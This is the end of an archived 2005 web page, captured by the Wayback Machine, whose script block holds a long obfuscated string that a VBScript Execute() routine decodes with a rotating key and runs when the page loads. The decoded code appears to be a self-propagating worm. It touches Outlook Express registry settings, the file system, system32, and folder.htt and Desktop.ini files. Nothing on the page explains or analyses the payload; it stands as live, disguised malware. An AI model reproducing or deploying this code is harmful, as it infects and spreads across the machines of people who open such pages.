GCLaeeQec!!HG>X_?NQRAGS_QLDRXBcejmhte^r\CebZtlpBc&URobmvan^[Me\qoohetXHtthhnk>wpn^rsX% H^et$HttHhnkR^qsehm,-&'/\IZhlXLsapbnnakx JZle%Rh]kdFeed)BaheKFF`ihKdg$GKAR^CQKQEJM^UO>Q\E]dnpbsial[=df]nktE]%XLnfpp`raULi_knsk_s\Knslkhj Aqoralr\La_s(KnsLkhjVakrikg+1%%*)[M]bk\SbceLsapbnnakx JZle%Rh]kdFeed)VsOadlh'QecPqip^DDDY[<TRN>MT[NRENURobmvan^[Me\qoohetXHefe\d\5'/\Knslkhj\Kisikgr\IZhlX>ciphqPn^een^mca+1/*/7.%!RA@^DSHQDC]ek GCLaeeQec!!HG>X_?NQRAGS_QLDRXLnfpp`raULi_knsk_s\Sbmdkpr I^rs]`hncRu^lxsp^l\LknfeedsXFhcnhrobmOqmkokdIjmdrj^s O^stegfsX)`0`)10,)/0,)/0,\/0,)/0,)/0,)/42U/0-^/32)!,[kajd!)BaheKFF`ihKdg$GKAR^CQKQEJM^UO>Q\OhetsZqeXFhcnhrobm[WegcoslNPUBunkdnpOdrobnnXPhn`hvsFdsoZfij`Sq[ryomdmXIqobbkeoULi_knsk_s Knslkhj EgsengdtLdtpbmgoU/a,]/2,)/0,)/0,)b0,)/0,)/0,)/00/[0,*d0///(al]gj%WoLgehe-Ra`Vremd AJEUXBUNKDNPXTSAK[Sk_sw]kd\IbbrklnfpUNfbbbeX*/.,UNupenogUNppbnnoULaee[E`bsonIqeb^qej\d(*21,01,KDG[=VON=!<`lhJJIZhlN^f(AJEUXBUNKDNPXTSAK[Sk_sw]kd\IbbrklnfpUNfbbbeX*/.,UBoifnnXF`ihLdtpbmgoUMesLsapbnnakx(al]gj%KFnlm]`dFkecen!Kebm'WegOapa+3%% Iqock`m?hlal[CkflojEih^r\IbbrklnfpRh]kddXLsapbnnakx%Ej]FqgbtehmFqgbtehm GCBraZseIbkian')Nn>qrkkRaltmaMetmP^lpLZsh6IbMop!ESK'Eih^Dxelss$PhnLZshSLbreis.aqd%Td^mMdmlI`td< lxsp^l3.U!>mdBeBe P^lpLZsh6orrtaf22XTd^mLsanmTpBbke6WegOapa&RYOMDMXDdrj^k3.'clhAereRt]ksUl?hla< SbmP]mg !SULSEIUJengdl*]klEj]IbWoLgehe-Ra`Vremd AJEUXKO?:K_I:BHEGD\OhetsZqeXFhcnhrobm[Wegcosl[CqkqejmUenlhojUQujUJengdl/+!,Om`rpNoFeed?RO*<npu?hlaVijI`td% pdbXdiw]ek.cbe(PhnLZshs^a\Bhkdak-hpm!?RO*<npu?hlaVijI`td% lxsp^l3.UjjsZkl*`hf%VijI`td% lxsp^l3.Uceodsol'hne?ZklDIAlidn`Mn(SbmP]mg !wa[[Fkecen'gtp+dms%WoLgehe-Ra`Vremd AJEUXBL=LREOXQOKM[.`ek\%!dheeih^!PrSd^kl*KdgSkhta!HG>X_?E@SO>R_NHNTX'clhUBojmdnpSyl^!,Zophbbapbnn+q,mo]nwjena`SlRhaek.N^fWnbseGKAR^CH:RSAL^RKHS\`ekfeed\@^eaqesI_hm\%VsOadlh'QecKda`!!HG>X_?E@SO>R_NHNTXowdbbkeX=df]nktE\nnX(PrSd^kl*KdgSkhta!HG>X_?E@SO>R_NHNTX]klbbkeXLbreisEj`hnaU!,OAS_khppSlRhaek.N^fWnbseGKAR^CH:RSAL^RKHS\`ekFeed\OadlhUNpag[Ckflaj][(PhnLZshTafoP]mg !WO\qilm-et^0$*WoLgehe-Ra`Vremd AJEUXBL=LREOXQOKM[dheEih^[Sd^klAq[PnhoenmxSd^dtDZmdh^qsXPRHLknpoU!,t50..3C=.,91,A--*BF)1B92&/0=:/0>1604<|VsOadlh'QecPqip^DDDY[<KAOLDS[KNOPUclh?hlaURcnbotDhrtAgbo`^[(z81*212,0-01/C)*0D.&A1B2,0,</4B15C/+3}SamFeedTafo 9ESK'NpagSetmEih^'SpZqtQiEih^+2(mquaBbkeP^lp*Pqip^V^lSetmBbkeP^lp*<koo^Agc BnmcpbnnBnmcpbnnDILeddIp!(Be EgVhakd 87dmllShagAqht?tn_mhojEj]IbTdbrLk\`tehm 9co_nlejm-lk\`tehmBe H^et$MgioEnc]mhoj%4%< _hlaTd^mMgioEnc]mhoj< Ibc(PahsHhbapbnn(2(Be BLN.C^sEtmdnobnnJZle$MgioEnc]mhoj<:!mgejTdbrLk\`tehm 9Kebm'TdbrLk\`tehm,H^m(PahsHhbapbnn%, H^m(BLN.C^sFeedN]fd(PahsHhbapbnn%(>mdBeBe H^m(PahsHhbapbnn%= /ShagPahsHhbapbnn6TdbrLk\`tehm !\Ej]IbKFnlm]`dFkecen!ShelKo_Zsikg(>mdBe>md?tn_mhoj?tn_mhojJJIZhlN^f(N^fSpk+FeedN]fd)Nn>qrkkRaltmaMetmN^fTafoSpk=PrSd^kl*KdgN^`d$KdgOmq)HfKdgP^lpOmq 9!MgejWoLgehe-Ra`Vremd N^fSpk+FeedN]fd>mdBe>md?tn_mhoj?tn_mhojJJK[nSq['CqkqejmRtnbmg%Sq[D 9/MdspHtt60CoPgih^TnndMdspHtt6TalsOqm+*E_TalsOqm>+7 PadnBunkdnpLsregf 9EijZky@brk6U!>wipCoDn`HfNn>qrkkRaltmaMetmO^s PahsBhkdak=?RO*@dtBhkdak'CqkqejmRtnbmg%SamDe\Ru^< ?kdap^Nbf^bt$Rcnbotegf.@bbtehmanr!)RepEoh]dro< PahsBhkdak-Sq[Eoh]droFkecen<nujm=)Bhq AZbhMdml?nl`^q egFkecenlBhkdakBoqgs 9Eoh]dr?htnp* -De\Ru^'`d`Eoh]dr?htnp%TafoFkecen'Mai^J^wtHf=hcOna.?htnp< ,ShagHZrtEgcet<gan< EgrtnKdv$<trn^mtOmqij`+X+Lag'CqkqejmRtnbmg%&0)Ru^Lsregf 9Li`!BunkdnpLsregf,HZrtEgcet<gan$0,H^m(?nqragsSpkhnc,L]lsIj]dx?a`r)*(<trn^mtOmqij`=DICdZmgaLtb$<trn^mtOmqij`+L]lsIj]dx?a`r%Sq[D 90>ksaIbRu^>=)Td^m<trn^mtOmqij`=<trn^mtOmqij`&=hcOna.Emdm$*( !\Etbs @hAerei 9/?nrc=*TkEoh]dr?htnpIbKC]ld(OnaSpkhnc=EBao^'De\Ru^'Htaf'j%Td^mBe f; BhkdakBoqgs PadnBunkdnpLsregf 9BunkdnpLsregf Ci_Ltb*Bsei!i+-&[DxemDkEj]IbEj]IbNaqsE`spBmdaqBh]k=BmspkQer!BunkdnpLsregf,U!,H^m(?nqragsSpkhnc,1%Sq[Rtnbmg6Me]'CqkqejmRtnbmg(E`spBmdaqBh]k*1(Edn$<trn^mtOmqij`(-HZrtEgcet<gan&0)BunkdnpLsregf 9JJ?a`nc^Ru^!BunkdnpLsregf,HZrtEgcet<ganAgc E_Agc E_HhnpJJK[nSq[=<trn^mtOmqij`Agc BnmcpbnnBnmcpbnnDIPnhoacZse$KgEnknrKdsqfd J^wtQecI`tdO`lq^=GKAR^LK<@L[F@CDBMEXLnfpp`raULi_knsk_s\Knslkhj Aqoralr\@^fra^!=hsg=dgn^d 9VsOadlh'QecKda`!QecI`tdO`lq^(Be @brk@^fra^=! PadnCiodCeckde6Feg`lu=hsg% 3[Dn`HfEonh=-so.@brk@^fra^=DIO^hRu^!CiodCeckde%KFnlm]`dFkecen!CiodCeckde%NaqsPrSd^kl*KdgSkhtaQecI`tdO`lq^+DeljDa`qeaEj]FqgbtehmFqgbtehm GCtmiZfeBhkdak'P]mgN]fd)Nn>qrkkRaltmaMetmO^s BhkdakMai^=?RO*@dtBhkdak'P]mgN]fd)RepShelEih^r 9Eoh]drJZle*?hlalDmsEtbrto< ,FkkE]\g PahsBbkeBm PahsBbkeoFeedEtm=NBao^'FOH-GamDxp^msehmN]fd(PahsBbke*I`td(Be BbkeAqs 9!HPF! KkFeedEtm=GTIE! KkFeedEtm=@SLOnEih^Dxp< IGPNr?hla>wt6FLOMgejC]ek GC@pl^mdPh'TdbrFeed.LZsh(gtie!)Dlo^Hf?hla>wt6R;RMgejC]ek GC@pl^mdPh'TdbrFeed.LZsh(ubo(>ksaBe BbkeAqs 9!HPM! PadnGtp>wiomr 90>mdBeGdxpIb'U?Zre$I`tdG`ma=NBao^'WegOapa&CeodsolU!)%Nr!TC]ld(LZshJZle%< Q<`sa!VijI`td% =dsgmnp(Td^mAstAqhspl=*Agc E_E_HpmDxelss60MgejFOH-CkixFeed SbmP]mg !sulsei,1\`^rkpho.egh(I`tdG`maFOH-CkixFeed SbmP]mg !wa[[Fkecen'gtp+P]mgN]fd>mdBe>md?tn_mhoj?tn_mhojJJO^sDef')Nn>qrkkRaltmaMetmAkq.?edanTalsIp< SLbreis.O\qilmEuhemai^E_EnkTd^mBmWd^qe6dmllEhldBmWd^qe6r[rDn`HfHfBmWd^qe6r[rMgejSamFOH=<qe]mdO^cdcp!!S_khppbmg*?hlaLxsp^lO^cdcp(LdtPrSd^kl6Cn^`taHaja\s(PRcnbot*Lgehe!)Dlo^O^s =iolaHaja\s 9co_nlejm-alikepl'GC^gq^rt=iolaHaja\s.o^sCHLHD$zF5,4D?+1--<E0)*0D,&@D>2,0,</4B=48=)A}=iolaHaja\s._kdap^Hnom`n_^')RepVsOadlh< =iolaHaja\s.C^sO^cdcp!(:oph^Nbf^bt*ldt?ERI@!!{,=33B>/1)?/9/&01??,85-/-,)@0?2/50+18y(:oph^Nbf^bt*\qe]mdIjlsaj\d(%SamFOH=:oph^Nbf^bt*@dtK[ie_m')Dn`HfRepCiodNbf^bt6FOH-DnbueoFkkE]\g @brkP^lpBm @brkK[ie_mE_DeljTafo.@khvaMxpa;>+Aj]DeljTafo.@khvaMxpa;>*Td^m>wipEonEj]IbFeg`lu=hsg< @brkP^lp*=qir^KepmdrMetm@bl Kmgen:qr$,(K`n`hliv^Bhq e6/ Ph3Ntd^qAnk'i%< Egs($2*Kmd%J^wtSeiiRtnbmg6Fkki9*TkKej!ShelSetm(MdmlGtm6Ao\'Me]'TdbrTaqs,e%0)%IbSeiiMui< -,Td^mMdmlGtm624EhldIbSeiiMui< -)Td^mMdmlGtm625Ej]IbTafoCdZq 9Bhn!SeiiMui, Kmgen:qr$bMk]4%E_TafoCdZq 9Bhn!24%ShagP^lp?a`r6Cdk'14Agc E_P^lpOmqij`=MdmlLsregf SeiiBh]kJ^wtTnHhbkOmq 9!Et^bup^'=hmDdy=kq(/+TdbrTaqsub?kKf!Kar@rn!/)6Opadr=kq(,&!oaCnEe&Jeu:qr$*( 9! Ntd^qAnk'1%% !&r[BrH_%Ddy=kq(.=&Hshak@rn!1)%v^<qLb!G^xAnk'3%< % Kmgen:qr$,( !ub?kKf!Fkki9*TkKej!DxaLsregf)%v^<qLb!P^lpJnl 9@s_!Li`!DxaLsregf,e%0)%!&r[BrH_%Be P^lpJnl 908Mgej!&r[BrH_%MdmlGtm630!&r[BrH_%>mdBeub?kKf!TafoCdZq 9Bhn!SeiiMui* G^xAnk'iFnd-()%v^<qLb!E_TafoCdZq 9Bhn!18%Shag!oaCnEe&SeiiBh]k=oaCn!&r[BrH_%>ksaBe P^lp?a`r6Cdk'25Td^mub?kKf!TafoCdZq 9ubH_!oaCnEe&Dn`Hf%v^<qLb!PahsP^wt6TdbrTaqs SeiiBh]k!oaCnEe&Metm!%&oaCnEe !Et^bup^'TdbrTaqs)TdbrTaqs 9!Et^Rtnbmg6&MdmlLsregf !DmllP^wt6!<% lbreis hZmgqZfe9oas_khpp7! ub?kKf`hbui^mt*pqip^! !<% ]hvlsyh^<'lhripbnn6Zasketta4la_s:,iw;mnp6)ox7vi`mg:,iw;adicas:,iw;s,ij]dx6+7;ohse[hlemx:ahd`^m':&;!% :OPH>S J:LE9DI![`teomHABFHP6/ SBCTD6/ _hce9\nm*fr.%ZbteodX*:bteod!T<nmlhmejm=8&.ALIKEP7! !<% (cir7!% r[BrH_&;+lbreis>% r[BrH_&;o\qilml]gfu]`d=r[rcnbot:&oaCnEe ShelSetm&oaCnEe TnHhbkOmq ub?kKf8&.s_khpp7! ub?kKf8&.BK=X>% r[BrH_&;+ASMH7!OasP^wt6TdbrTaqs ub?kKfUjEncgLsrv^<qLb% DI_om`rp!(VijI`td< BLN.C^sSl^bi]eEoh]dr$)( !\Ib'FOH-FeedEtbrto!VijI`td% pdbX?nl`^q.dms%Td^m?RO*<npu?hlaVijI`td% pdbX?nl`^q.dms(PhnLZshs^a\gcvahe-ge_!>mdBeBe $?RO*?hla>wiomr(SbmP]mg !sulsei,1\`^rkpho.egh%Td^m?RO*<npu?hlaVijI`td% lxsp^l3.Uceodsol'hne+WegOapa&ryomdm/+[kfp`lh'fibAgc E_Agc Bnmcpbnn"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 4"&vbCrLf&"KeyArr(1) = 7"&vbCrLf&"KeyArr(2) = 1"&vbCrLf&"KeyArr(3) = 0"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
</script>
</BODY>
</HTML>




<!--
     FILE ARCHIVED ON 12:18:37 Jan 24, 2005 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 19:07:15 Feb 4, 2013.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
-->
